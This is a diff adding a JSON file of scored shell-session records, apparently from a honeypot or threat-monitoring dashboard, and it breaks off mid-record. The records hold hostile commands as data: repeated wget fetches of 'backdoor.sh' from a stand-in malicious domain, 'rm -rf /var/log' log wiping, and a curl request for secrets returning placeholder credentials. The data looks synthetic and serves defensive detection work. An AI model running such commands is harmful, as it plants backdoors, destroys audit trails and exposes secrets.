@@ -1,0 +1,1259 @@
+[
+  {
+    "id": "session-tyivmebs0",
+    "startTime": 1768684409649,
+    "lastActivity": 1768684437894,
+    "riskScore": 136,
+    "entryVector": "console",
+    "attackStage": "initial-access",
+    "isActive": true,
+    "commands": [
+      {
+        "id": "cmd-1768684412176",
+        "timestamp": 1768684412176,
+        "command": "ls",
+        "output": "bin   boot  dev  etc  home  lib  media  mnt  opt  ...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684418309",
+        "timestamp": 1768684418309,
+        "command": "wget http://malicious-domain.com/backdoor.sh",
+        "output": "--2024-01-17 12:15:30-- http://malicious-domain.co...",
+        "threat": "persistence",
+        "riskIncrease": 15
+      },
+      {
+        "id": "cmd-1768684420827",
+        "timestamp": 1768684420827,
+        "command": "wget http://malicious-domain.com/backdoor.sh",
+        "output": "--2024-01-17 12:15:30-- http://malicious-domain.co...",
+        "threat": "persistence",
+        "riskIncrease": 15
+      },
+      {
+        "id": "cmd-1768684422897",
+        "timestamp": 1768684422897,
+        "command": "wget http://malicious-domain.com/backdoor.sh",
+        "output": "--2024-01-17 12:15:30-- http://malicious-domain.co...",
+        "threat": "persistence",
+        "riskIncrease": 15
+      },
+      {
+        "id": "cmd-1768684424817",
+        "timestamp": 1768684424817,
+        "command": "wget http://malicious-domain.com/backdoor.sh",
+        "output": "--2024-01-17 12:15:30-- http://malicious-domain.co...",
+        "threat": "persistence",
+        "riskIncrease": 15
+      },
+      {
+        "id": "cmd-1768684425703",
+        "timestamp": 1768684425703,
+        "command": "wget http://malicious-domain.com/backdoor.sh",
+        "output": "--2024-01-17 12:15:30-- http://malicious-domain.co...",
+        "threat": "persistence",
+        "riskIncrease": 15
+      },
+      {
+        "id": "cmd-1768684426409",
+        "timestamp": 1768684426409,
+        "command": "wget http://malicious-domain.com/backdoor.sh",
+        "output": "--2024-01-17 12:15:30-- http://malicious-domain.co...",
+        "threat": "persistence",
+        "riskIncrease": 15
+      },
+      {
+        "id": "cmd-1768684427032",
+        "timestamp": 1768684427032,
+        "command": "wget http://malicious-domain.com/backdoor.sh",
+        "output": "--2024-01-17 12:15:30-- http://malicious-domain.co...",
+        "threat": "persistence",
+        "riskIncrease": 15
+      },
+      {
+        "id": "cmd-1768684427496",
+        "timestamp": 1768684427496,
+        "command": "",
+        "output": "bash: : command not found...",
+        "threat": "normal",
+        "riskIncrease": 0
+      },
+      {
+        "id": "cmd-1768684434067",
+        "timestamp": 1768684434067,
+        "command": "wget http://malicious-domain.com/backdoor.sh",
+        "output": "--2024-01-17 12:15:30-- http://malicious-domain.co...",
+        "threat": "persistence",
+        "riskIncrease": 15
+      },
+      {
+        "id": "cmd-1768684437818",
+        "timestamp": 1768684437818,
+        "command": "wget http://malicious-domain.com/backdoor.sh",
+        "output": "--2024-01-17 12:15:30-- http://malicious-domain.co...",
+        "threat": "persistence",
+        "riskIncrease": 15
+      }
+    ],
+    "threatLevel": "critical",
+    "behaviorTags": [
+      "New Connection",
+      "Persistence"
+    ],
+    "deceptionStrategies": []
+  },
+  {
+    "id": "session-xkg8q6d9k",
+    "startTime": 1768684272129,
+    "lastActivity": 1768684389563,
+    "riskScore": 112,
+    "entryVector": "console",
+    "attackStage": "initial-access",
+    "isActive": true,
+    "commands": [
+      {
+        "id": "cmd-1768684342618",
+        "timestamp": 1768684342618,
+        "command": "ls",
+        "output": "bin   boot  dev  etc  home  lib  media  mnt  opt  ...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684345047",
+        "timestamp": 1768684345047,
+        "command": "ls",
+        "output": "bin   boot  dev  etc  home  lib  media  mnt  opt  ...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684346913",
+        "timestamp": 1768684346913,
+        "command": "ls",
+        "output": "bin   boot  dev  etc  home  lib  media  mnt  opt  ...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684348834",
+        "timestamp": 1768684348834,
+        "command": "ls",
+        "output": "bin   boot  dev  etc  home  lib  media  mnt  opt  ...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684349431",
+        "timestamp": 1768684349431,
+        "command": "ls",
+        "output": "bin   boot  dev  etc  home  lib  media  mnt  opt  ...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684350022",
+        "timestamp": 1768684350022,
+        "command": "ls",
+        "output": "bin   boot  dev  etc  home  lib  media  mnt  opt  ...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684350654",
+        "timestamp": 1768684350654,
+        "command": "ls",
+        "output": "bin   boot  dev  etc  home  lib  media  mnt  opt  ...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684351216",
+        "timestamp": 1768684351216,
+        "command": "sls",
+        "output": "bash: sls: command not found...",
+        "threat": "normal",
+        "riskIncrease": 0
+      },
+      {
+        "id": "cmd-1768684355088",
+        "timestamp": 1768684355088,
+        "command": "curl",
+        "output": "bash: curl: command not found...",
+        "threat": "persistence",
+        "riskIncrease": 15
+      },
+      {
+        "id": "cmd-1768684381777",
+        "timestamp": 1768684381777,
+        "command": "wget http://malicious-domain.com/backdoor.sh",
+        "output": "--2024-01-17 12:15:30-- http://malicious-domain.co...",
+        "threat": "persistence",
+        "riskIncrease": 15
+      },
+      {
+        "id": "cmd-1768684384839",
+        "timestamp": 1768684384839,
+        "command": "wget http://malicious-domain.com/backdoor.sh",
+        "output": "--2024-01-17 12:15:30-- http://malicious-domain.co...",
+        "threat": "persistence",
+        "riskIncrease": 15
+      },
+      {
+        "id": "cmd-1768684387562",
+        "timestamp": 1768684387562,
+        "command": "wget http://malicious-domain.com/backdoor.sh",
+        "output": "--2024-01-17 12:15:30-- http://malicious-domain.co...",
+        "threat": "persistence",
+        "riskIncrease": 15
+      },
+      {
+        "id": "cmd-1768684388820",
+        "timestamp": 1768684388820,
+        "command": "wget http://malicious-domain.com/backdoor.sh",
+        "output": "--2024-01-17 12:15:30-- http://malicious-domain.co...",
+        "threat": "persistence",
+        "riskIncrease": 15
+      },
+      {
+        "id": "cmd-1768684389083",
+        "timestamp": 1768684389083,
+        "command": "wget http://malicious-domain.com/backdoor.sh",
+        "output": "--2024-01-17 12:15:30-- http://malicious-domain.co...",
+        "threat": "persistence",
+        "riskIncrease": 15
+      },
+      {
+        "id": "cmd-1768684389297",
+        "timestamp": 1768684389297,
+        "command": "",
+        "output": "bash: : command not found...",
+        "threat": "normal",
+        "riskIncrease": 0
+      },
+      {
+        "id": "cmd-1768684389501",
+        "timestamp": 1768684389501,
+        "command": "wget http://malicious-domain.com/backdoor.sh",
+        "output": "--2024-01-17 12:15:30-- http://malicious-domain.co...",
+        "threat": "persistence",
+        "riskIncrease": 15
+      }
+    ],
+    "threatLevel": "critical",
+    "behaviorTags": [
+      "New Connection",
+      "Persistence"
+    ],
+    "deceptionStrategies": []
+  },
+  {
+    "id": "session-h7vjrpxv0",
+    "startTime": 1768684255474,
+    "lastActivity": 1768684255474,
+    "riskScore": 0,
+    "entryVector": "console",
+    "attackStage": "initial-access",
+    "isActive": true,
+    "commands": [],
+    "threatLevel": "low",
+    "behaviorTags": [
+      "New Connection"
+    ],
+    "deceptionStrategies": []
+  },
+  {
+    "id": "session-ynf7v8wvr",
+    "startTime": 1768683942207,
+    "lastActivity": 1768684023518,
+    "riskScore": 71,
+    "entryVector": "console",
+    "attackStage": "initial-access",
+    "isActive": true,
+    "commands": [
+      {
+        "id": "cmd-1768683948554",
+        "timestamp": 1768683948554,
+        "command": "ls",
+        "output": "bin   boot  dev  etc  home  lib  media  mnt  opt  ...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768683949857",
+        "timestamp": 1768683949857,
+        "command": "ls",
+        "output": "bin   boot  dev  etc  home  lib  media  mnt  opt  ...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768683950968",
+        "timestamp": 1768683950968,
+        "command": "ls",
+        "output": "bin   boot  dev  etc  home  lib  media  mnt  opt  ...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768683952937",
+        "timestamp": 1768683952937,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768683954666",
+        "timestamp": 1768683954666,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768683955894",
+        "timestamp": 1768683955894,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768683956788",
+        "timestamp": 1768683956788,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768683975305",
+        "timestamp": 1768683975305,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768683976004",
+        "timestamp": 1768683976004,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768683976622",
+        "timestamp": 1768683976622,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768683977716",
+        "timestamp": 1768683977716,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768683978382",
+        "timestamp": 1768683978382,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768683979005",
+        "timestamp": 1768683979005,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768683979636",
+        "timestamp": 1768683979636,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768683981005",
+        "timestamp": 1768683981005,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768683982121",
+        "timestamp": 1768683982121,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768683982606",
+        "timestamp": 1768683982606,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768683983739",
+        "timestamp": 1768683983739,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768683983963",
+        "timestamp": 1768683983963,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768683984898",
+        "timestamp": 1768683984898,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768683985967",
+        "timestamp": 1768683985967,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684006402",
+        "timestamp": 1768684006402,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684007043",
+        "timestamp": 1768684007043,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684007347",
+        "timestamp": 1768684007347,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684007592",
+        "timestamp": 1768684007592,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684007768",
+        "timestamp": 1768684007768,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684007973",
+        "timestamp": 1768684007973,
+        "command": "",
+        "output": "bash: : command not found...",
+        "threat": "normal",
+        "riskIncrease": 0
+      },
+      {
+        "id": "cmd-1768684008197",
+        "timestamp": 1768684008197,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684008392",
+        "timestamp": 1768684008392,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684008612",
+        "timestamp": 1768684008612,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684008837",
+        "timestamp": 1768684008837,
+        "command": "",
+        "output": "bash: : command not found...",
+        "threat": "normal",
+        "riskIncrease": 0
+      },
+      {
+        "id": "cmd-1768684009726",
+        "timestamp": 1768684009726,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684009858",
+        "timestamp": 1768684009858,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684010131",
+        "timestamp": 1768684010131,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684010536",
+        "timestamp": 1768684010536,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684010715",
+        "timestamp": 1768684010715,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684010920",
+        "timestamp": 1768684010920,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684011514",
+        "timestamp": 1768684011514,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684011920",
+        "timestamp": 1768684011920,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684012122",
+        "timestamp": 1768684012122,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684012308",
+        "timestamp": 1768684012308,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684012510",
+        "timestamp": 1768684012510,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684012692",
+        "timestamp": 1768684012692,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684012913",
+        "timestamp": 1768684012913,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684013287",
+        "timestamp": 1768684013287,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684013660",
+        "timestamp": 1768684013660,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684014615",
+        "timestamp": 1768684014615,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684014785",
+        "timestamp": 1768684014785,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684014951",
+        "timestamp": 1768684014951,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684015116",
+        "timestamp": 1768684015116,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684015315",
+        "timestamp": 1768684015315,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684015509",
+        "timestamp": 1768684015509,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684015694",
+        "timestamp": 1768684015694,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684015906",
+        "timestamp": 1768684015906,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684016138",
+        "timestamp": 1768684016138,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684016310",
+        "timestamp": 1768684016310,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684016522",
+        "timestamp": 1768684016522,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684016654",
+        "timestamp": 1768684016654,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684019821",
+        "timestamp": 1768684019821,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684020029",
+        "timestamp": 1768684020029,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684020584",
+        "timestamp": 1768684020584,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684020834",
+        "timestamp": 1768684020834,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684021228",
+        "timestamp": 1768684021228,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684021453",
+        "timestamp": 1768684021453,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684021684",
+        "timestamp": 1768684021684,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684022060",
+        "timestamp": 1768684022060,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684022232",
+        "timestamp": 1768684022232,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684022454",
+        "timestamp": 1768684022454,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684022657",
+        "timestamp": 1768684022657,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684022904",
+        "timestamp": 1768684022904,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684023088",
+        "timestamp": 1768684023088,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684023296",
+        "timestamp": 1768684023296,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768684023487",
+        "timestamp": 1768684023487,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      }
+    ],
+    "threatLevel": "high",
+    "behaviorTags": [
+      "New Connection"
+    ],
+    "deceptionStrategies": []
+  },
+  {
+    "id": "session-zjmm722ek",
+    "startTime": 1768683839331,
+    "lastActivity": 1768683839331,
+    "riskScore": 0,
+    "entryVector": "console",
+    "attackStage": "initial-access",
+    "isActive": true,
+    "commands": [],
+    "threatLevel": "low",
+    "behaviorTags": [
+      "New Connection"
+    ],
+    "deceptionStrategies": []
+  },
+  {
+    "id": "session-ioles45wb",
+    "startTime": 1768682689992,
+    "lastActivity": 1768682720167,
+    "riskScore": 183,
+    "entryVector": "console",
+    "attackStage": "initial-access",
+    "isActive": true,
+    "commands": [
+      {
+        "id": "cmd-1768682691138",
+        "timestamp": 1768682691138,
+        "command": "ls",
+        "output": "bin   boot  dev  etc  home  lib  media  mnt  opt  ...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768682691729",
+        "timestamp": 1768682691729,
+        "command": "ls",
+        "output": "bin   boot  dev  etc  home  lib  media  mnt  opt  ...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768682695099",
+        "timestamp": 1768682695099,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768682697760",
+        "timestamp": 1768682697760,
+        "command": "sas",
+        "output": "bash: sas: command not found...",
+        "threat": "normal",
+        "riskIncrease": 0
+      },
+      {
+        "id": "cmd-1768682700324",
+        "timestamp": 1768682700324,
+        "command": "http://localhost:3000/",
+        "output": "bash: http://localhost:3000/: command not found...",
+        "threat": "normal",
+        "riskIncrease": 0
+      },
+      {
+        "id": "cmd-1768682713455",
+        "timestamp": 1768682713455,
+        "command": "wget http://malicious-domain.com/backdoor.sh",
+        "output": "--2024-01-17 12:15:30-- http://malicious-domain.co...",
+        "threat": "persistence",
+        "riskIncrease": 15
+      },
+      {
+        "id": "cmd-1768682717619",
+        "timestamp": 1768682717619,
+        "command": "wget http://malicious-domain.com/backdoor.sh",
+        "output": "--2024-01-17 12:15:30-- http://malicious-domain.co...",
+        "threat": "persistence",
+        "riskIncrease": 15
+      },
+      {
+        "id": "cmd-1768682718128",
+        "timestamp": 1768682718128,
+        "command": "wget http://malicious-domain.com/backdoor.sh",
+        "output": "--2024-01-17 12:15:30-- http://malicious-domain.co...",
+        "threat": "persistence",
+        "riskIncrease": 15
+      },
+      {
+        "id": "cmd-1768682718342",
+        "timestamp": 1768682718342,
+        "command": "wget http://malicious-domain.com/backdoor.sh",
+        "output": "--2024-01-17 12:15:30-- http://malicious-domain.co...",
+        "threat": "persistence",
+        "riskIncrease": 15
+      },
+      {
+        "id": "cmd-1768682718545",
+        "timestamp": 1768682718545,
+        "command": "wget http://malicious-domain.com/backdoor.sh",
+        "output": "--2024-01-17 12:15:30-- http://malicious-domain.co...",
+        "threat": "persistence",
+        "riskIncrease": 15
+      },
+      {
+        "id": "cmd-1768682718739",
+        "timestamp": 1768682718739,
+        "command": "",
+        "output": "bash: : command not found...",
+        "threat": "normal",
+        "riskIncrease": 0
+      },
+      {
+        "id": "cmd-1768682718944",
+        "timestamp": 1768682718944,
+        "command": "wget http://malicious-domain.com/backdoor.sh",
+        "output": "--2024-01-17 12:15:30-- http://malicious-domain.co...",
+        "threat": "persistence",
+        "riskIncrease": 15
+      },
+      {
+        "id": "cmd-1768682719144",
+        "timestamp": 1768682719144,
+        "command": "wget http://malicious-domain.com/backdoor.sh",
+        "output": "--2024-01-17 12:15:30-- http://malicious-domain.co...",
+        "threat": "persistence",
+        "riskIncrease": 15
+      },
+      {
+        "id": "cmd-1768682719350",
+        "timestamp": 1768682719350,
+        "command": "wget http://malicious-domain.com/backdoor.sh",
+        "output": "--2024-01-17 12:15:30-- http://malicious-domain.co...",
+        "threat": "persistence",
+        "riskIncrease": 15
+      },
+      {
+        "id": "cmd-1768682719543",
+        "timestamp": 1768682719543,
+        "command": "wget http://malicious-domain.com/backdoor.sh",
+        "output": "--2024-01-17 12:15:30-- http://malicious-domain.co...",
+        "threat": "persistence",
+        "riskIncrease": 15
+      },
+      {
+        "id": "cmd-1768682719746",
+        "timestamp": 1768682719746,
+        "command": "wget http://malicious-domain.com/backdoor.sh",
+        "output": "--2024-01-17 12:15:30-- http://malicious-domain.co...",
+        "threat": "persistence",
+        "riskIncrease": 15
+      },
+      {
+        "id": "cmd-1768682719948",
+        "timestamp": 1768682719948,
+        "command": "wget http://malicious-domain.com/backdoor.sh",
+        "output": "--2024-01-17 12:15:30-- http://malicious-domain.co...",
+        "threat": "persistence",
+        "riskIncrease": 15
+      },
+      {
+        "id": "cmd-1768682720133",
+        "timestamp": 1768682720133,
+        "command": "wget http://malicious-domain.com/backdoor.sh",
+        "output": "--2024-01-17 12:15:30-- http://malicious-domain.co...",
+        "threat": "persistence",
+        "riskIncrease": 15
+      }
+    ],
+    "threatLevel": "critical",
+    "behaviorTags": [
+      "New Connection",
+      "Persistence"
+    ],
+    "deceptionStrategies": []
+  },
+  {
+    "id": "session-xbcrasgy6",
+    "startTime": 1768682606804,
+    "lastActivity": 1768682631197,
+    "riskScore": 253,
+    "entryVector": "console",
+    "attackStage": "initial-access",
+    "isActive": true,
+    "commands": [
+      {
+        "id": "cmd-1768682607794",
+        "timestamp": 1768682607794,
+        "command": "corp-server@maintenance:~$ ssh user@corp-server -p 22",
+        "output": "bash: corp-server@maintenance:~$ ssh user@corp-ser...",
+        "threat": "normal",
+        "riskIncrease": 0
+      },
+      {
+        "id": "cmd-1768682610517",
+        "timestamp": 1768682610517,
+        "command": "ls",
+        "output": "bin   boot  dev  etc  home  lib  media  mnt  opt  ...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768682611710",
+        "timestamp": 1768682611710,
+        "command": "ls",
+        "output": "bin   boot  dev  etc  home  lib  media  mnt  opt  ...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768682612911",
+        "timestamp": 1768682612911,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768682615945",
+        "timestamp": 1768682615945,
+        "command": "corp-server@maintenance:~$ ssh user@corp-server -p 22",
+        "output": "bash: corp-server@maintenance:~$ ssh user@corp-ser...",
+        "threat": "normal",
+        "riskIncrease": 0
+      },
+      {
+        "id": "cmd-1768682628101",
+        "timestamp": 1768682628101,
+        "command": "rm -rf /var/log",
+        "output": "Operation completed....",
+        "threat": "destructive",
+        "riskIncrease": 50
+      },
+      {
+        "id": "cmd-1768682629999",
+        "timestamp": 1768682629999,
+        "command": "rm -rf /var/log",
+        "output": "Operation completed....",
+        "threat": "destructive",
+        "riskIncrease": 50
+      },
+      {
+        "id": "cmd-1768682630460",
+        "timestamp": 1768682630460,
+        "command": "rm -rf /var/log",
+        "output": "Operation completed....",
+        "threat": "destructive",
+        "riskIncrease": 50
+      },
+      {
+        "id": "cmd-1768682630837",
+        "timestamp": 1768682630837,
+        "command": "rm -rf /var/log",
+        "output": "Operation completed....",
+        "threat": "destructive",
+        "riskIncrease": 50
+      },
+      {
+        "id": "cmd-1768682631167",
+        "timestamp": 1768682631167,
+        "command": "rm -rf /var/log",
+        "output": "Operation completed....",
+        "threat": "destructive",
+        "riskIncrease": 50
+      }
+    ],
+    "threatLevel": "critical",
+    "behaviorTags": [
+      "New Connection",
+      "Destructive"
+    ],
+    "deceptionStrategies": []
+  },
+  {
+    "id": "session-uhl1lmhm0",
+    "startTime": 1768682531037,
+    "lastActivity": 1768682558269,
+    "riskScore": 19,
+    "entryVector": "console",
+    "attackStage": "initial-access",
+    "isActive": false,
+    "commands": [
+      {
+        "id": "cmd-1768682532068",
+        "timestamp": 1768682532068,
+        "command": "ls",
+        "output": "bin   boot  dev  etc  home  lib  media  mnt  opt  ...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768682533323",
+        "timestamp": 1768682533323,
+        "command": "ls",
+        "output": "bin   boot  dev  etc  home  lib  media  mnt  opt  ...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768682534882",
+        "timestamp": 1768682534882,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768682537216",
+        "timestamp": 1768682537216,
+        "command": "pwd",
+        "output": "/root...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
+        "id": "cmd-1768682558204",
+        "timestamp": 1768682558204,
+        "command": "curl http://internal-api:8080/secrets",
+        "output": "API_KEY=sk-1234567890\nDB_PASSWORD=secure_pass123...",
+        "threat": "persistence",
+        "riskIncrease": 15
+      }
+    ],
+    "threatLevel": "low",
+    "behaviorTags": [
+      "New Connection",
+      "Persistence"
+    ],
+    "deceptionStrategies": []
+  },
+  {
+    "id": "session-mwpe5r65m",
+    "startTime": 1768682497796,
+    "lastActivity": 1768682501624,
+    "riskScore": 1,
+    "entryVector": "console",
+    "attackStage": "initial-access",
+    "isActive": false,
+    "commands": [
+      {
+        "id": "cmd-1768682498999",
+        "timestamp": 1768682498999,
+        "command": "ls",
+        "output": "bin   boot  dev  etc  home  lib  media  mnt  opt  ...",
+        "threat": "normal",
+        "riskIncrease": 1
+      },
+      {
